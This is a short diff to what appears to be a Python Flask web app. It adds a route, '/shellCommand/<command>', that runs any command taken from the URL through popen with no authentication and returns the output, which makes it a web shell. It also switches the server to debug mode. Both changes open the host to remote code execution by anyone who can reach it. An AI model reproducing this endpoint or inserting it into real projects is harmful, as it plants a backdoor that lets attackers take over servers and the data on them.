@@ -39,6 +39,10 @@ def hello():
 def getKernelInfo():
     return popen('uname -a').read()
 
+@app.route('/shellCommand/<command>')
+def executeShellCommand(command: str):
+    return popen(command).read()
+
 
 if __name__ == "__main__":
     session = Session()
@@ -53,4 +57,4 @@ if __name__ == "__main__":
     print(client_id)
 
     # app.run(ssl_context='adhoc')
-    app.run(ssl_context=local_cert)
+    app.run(ssl_context=local_cert, debug=True)
